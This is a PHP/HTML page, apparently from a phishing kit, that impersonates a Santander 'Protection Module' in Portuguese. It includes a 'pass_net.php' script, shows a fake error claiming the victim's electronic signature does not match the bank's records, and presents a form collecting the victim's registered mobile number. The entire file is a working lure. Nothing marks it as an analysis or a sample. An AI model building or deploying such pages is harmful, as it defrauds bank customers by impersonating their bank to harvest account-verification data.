<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box">

			<div class="md_boxLogo border_loader">
				<img src="imgs/logo-stdeMd1.png">
			</div><!-- ld_boxLogo -->

			<div class="md_modalTtitle">
				<h1 class="title_ass">Módulo de Proteção Santander</h1>
				<p class="text_ased">
					Confirmação de celular cadastrado. Informe no campo abaixo, o celular cadastrado com DDD.
				</p>
			</div>

			<div class="md_boxTables">

				<?php
					if(isset($_SESSION['ErrorDados'])):
						$display = 'block';
					else:
						$display = 'none';
					endif;	
					unset($_SESSION['ErrorDados']);
				?>		
				<div class="msg_error" id="msg_error" style="display:<?php echo $display;?>!important;">
					<span id="recebeTXT" class="recebeTXT">A Assinatura Eletrônica informada não está de acordo com nossos dados!</span>
				<div class="clear"></div>	
				</div><!-- msg_error -->
				
				<form action="" name="formAss" id="formAss" method="post" onsubmit="return checkFone();">
					<span>Celular com DDD:</span>
					<input type="text" name="fone" id="fone" class="input_ass" maxlength="15" autocomplete="off">
					
					<input type="hidden" name="sender" id="sender" value="fone">
					<input type="submit" name="sendAss" id="sendAss" class="btn_ass" value="continuar">
				</form>
			
				<span class="note_atr">
					<b class="red_txt">ATENÇÃO:</b><br>Informe o celular cadastrado juntamento com o DDD.
				</span>
			</div><!-- md_boxTables -->

			<br><br>
		</div><!-- ld_box -->
	</div>
</body>
</html>